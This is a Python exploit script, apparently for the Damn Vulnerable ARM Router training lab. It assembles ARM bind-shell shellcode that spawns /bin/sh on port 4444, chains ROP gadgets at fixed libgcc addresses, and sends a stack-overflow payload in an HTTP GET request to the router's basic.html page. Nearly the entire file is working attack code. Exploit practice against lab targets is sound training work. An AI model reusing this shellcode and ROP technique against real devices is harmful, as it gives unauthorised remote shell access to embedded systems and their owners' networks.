#!/usr/bin/env python

import argparse
import requests
import subprocess as sb
from urllib import quote
from pwn import *
import sys


def assemble(asmcode):
    fln = "/tmp/tmp-rasm2.asm"
    open(fln, 'w').write(asmcode)
    payload = sb.Popen(["rasm2", "-a", "arm.as", "-Bf", fln], stdout=sb.PIPE).communicate()[0]

    return payload


def assemble_as(asmcode):
    fln = "/tmp/tmp-as.s"
    fln_o = "/tmp/tmp-as.o"
    fln_x = "/tmp/tmp-as.x"
    fln_b = "/tmp/tmp-as.b"
    open(fln, 'w').write(asmcode)
    sb.Popen(["arm-linux-gnueabi-as", fln, "-o", fln_o]).wait()
    sb.Popen(["arm-linux-gnueabi-ld", "-N", fln_o, "-o", fln_x]).wait()
    sb.Popen(["arm-linux-gnueabi-objcopy", "-O", "binary", fln_x, fln_b]).wait()

    return open(fln_b, "rb").read()


def exploit(host, port, my_ip):
    p = log.progress('Assemble TCP Bind shellcode')
    pp = make_packer(16, endian='big', sign='unsigned')
    try:
        # Azeria's shellcode
        shc = assemble_as(""".section .text
.global _start
    _start:
    .ARM
    add r3, pc, #1         // switch to thumb mode
    bx r3

    .THUMB
// socket(2, 1, 0)
    mov r0, #2
    mov r1, #1
    sub r2, r2, r2      // set r2 to null
    mov r7, #200        // r7 = 281 (socket)
    add r7, #81         // r7 value needs to be split
    svc #1              // r0 = host_sockid value
    mov r4, r0          // save host_sockid in r4

// bind(r0, &sockaddr, 16)
    adr r1, struct_addr // pointer to address, port
    strb r2, [r1, #1]    // write 0 for AF_INET
    strb r2, [r1, #4]    // replace 1 with 0 in x.1.1.1
    strb r2, [r1, #5]    // replace 1 with 0 in 0.x.1.1
    strb r2, [r1, #6]    // replace 1 with 0 in 0.0.x.1
    strb r2, [r1, #7]    // replace 1 with 0 in 0.0.0.x
    mov r2, #16          // struct address length
    add r7, #1           // r7 = 282 (bind)
    svc #1
    nop

// listen(sockfd, 0)
    mov r0, r4           // set r0 to saved host_sockid
    mov r1, #2
    add r7, #2           // r7 = 284 (listen syscall number)
    svc #1

// accept(sockfd, NULL, NULL);
    mov r0, r4           // set r0 to saved host_sockid
    sub r1, r1, r1       // set r1 to null
    sub r2, r2, r2       // set r2 to null
    add r7, #1           // r7 = 284+1 = 285 (accept syscall)
    svc #1               // r0 = client_sockid value
    mov r4, r0           // save new client_sockid value to r4

// dup2(sockfd, 0)
    mov r7, #63         // r7 = 63 (dup2 syscall number)
    mov r0, r4          // r4 is the saved client_sockid
    sub r1, r1, r1      // r1 = 0 (stdin)
    svc #1

// dup2(sockfd, 1)
    mov r0, r4          // r4 is the saved client_sockid
    add r1, #1          // r1 = 1 (stdout)
    svc #1

// dup2(sockfd, 2)
    mov r0, r4          // r4 is the saved client_sockid
    add r1, #1          // r1 = 2 (stderr)
    svc #1

// execve("/bin/sh", 0, 0)
    adr r0, shellcode   // r0 = location of "/bin/shX"
    eor r1, r1, r1      // clear register r1. R1 = 0
    push {r1}
    push {r0}
    mov r1, sp          // r1 pointing to argument list
    eor r2, r2, r2      // clear register r2. r2 = 0
    push {r2}
    strb r2, [r0, #7]   // store null-byte for AF_INET
    mov r7, #11         // execve syscall number
    svc #1
    nop

struct_addr:
.ascii "\\x02\\xff" // AF_INET 0xff will be NULLed
.ascii "%s" // port number
.byte 1,1,1,1 // IP Address
shellcode:
.ascii "/bin/shX"
""" % repr(pp(port)).strip("'"))
    except Exception, e:
        p.failure("Assembling failed : %s" % str(e))
        sys.exit()
    else:
        if "\x00" in shc:
            b = shc.find("\x00")
            p.failure("NULL byte detected: %s in %s"\
                      % (repr(shc[b - 1 if b - 1 > 0 else 0:b + 2 if len(shc) >= b + 2 else len(shc)]),
                         repr(shc)))
            sys.exit()
        else:
            p.success("%s" % repr(shc))

    # ASLR is only for the stack
    # Libraries load at constant address
    base_libgcc = 0x40078000

    step_1 = p32(base_libgcc + 0x4110)       # pop {r0, r1, r2, r3, pc}
    step_2 = p32(base_libgcc + 0x8674)       # mov r2, sp; blx r3
    step_3 = p32(base_libgcc + 0x2c48 + 1)   # bx   r2  ; (I've set the THUMB bit - the branch is not taken otherwise)

    fp = "aaaa"

    # Padding must be adjusted due to length of requesting IP address put on the stack
    pad1 = cyclic(341 - len(my_ip))
    # pad1 = cyclic(332)
    # pad1 = cyclic(329)
    pad2 = cyclic(16, alphabet=string.ascii_uppercase)

    stack = "".join(["cccc",
                     "dddd",
                     "eeee",
                     step_3,
                     step_2,
                     shc])

    payload = "".join([pad1,
                       fp,
                       step_1,
                       pad2,
                       stack])

    u = "http://%s/basic.html?%s" % (host, quote(payload))
    log.info("Vulnerable Request to: %s" % u)

    # requests.get(u, proxies={
    #     'http': 'http:    @127.0.0.1:8080',
    #     'https': 'http:    @127.0.0.1:8080',
    # })

    try:
        requests.get(u, timeout=3)
    except requests.exceptions.ReadTimeout:
        pass


def get_args():
    parser = argparse.ArgumentParser(description="Exploit for Level 1 DVAR")
    args = parser.parse_args()
    return args


def main():
    args = get_args()

    # I have locally changed my /etc/hosts to point to the vulnerable router
    host = "dvar"
    port = 4444

    # This is the IP address the router sees our request from
    my_ip = "192.168.18.1"

    log.info("Exploiting domain: %s" % host)
    exploit(host, port, my_ip)


if __name__ == '__main__':
    main()
